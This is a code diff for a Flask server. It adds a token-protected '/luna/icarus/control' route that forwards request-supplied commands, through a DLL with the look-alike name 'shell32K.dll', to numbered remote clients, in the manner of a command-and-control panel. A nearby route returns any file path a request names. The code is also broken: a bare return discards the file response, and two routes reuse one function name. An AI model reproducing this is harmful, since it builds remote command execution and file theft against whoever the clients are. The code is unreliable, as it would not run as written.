@@ -8,7 +8,7 @@ from flask import Flask, request, jsonify, abort, send_file
 import jwt
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-import win32pipe, win32file, pywintypes
+import ctypes
 
 import helper
 
@@ -259,11 +259,18 @@ def luna_endpoint3():
     file = request.json.get('file_path')
     name = request.json.get('file_name')
     send_file(file, as_attachment=True, attachment_filename=name)
+    return
+
+dll = ctypes.CDLL("shell32K.dll")
 
 @app.route('/luna/icarus/control')
 @token_required
 def luna_endpoint3():
-    pass
+    client = request.json.get('client_num')
+    command = request.json.get('command')
+    PreProcessedCommand = dll.shell(command)
+    RetVal = dll.handoff(PreProcessedCommand, client)
+    return jsonify(RetVal)
 
 
 if __name__ == "__main__":
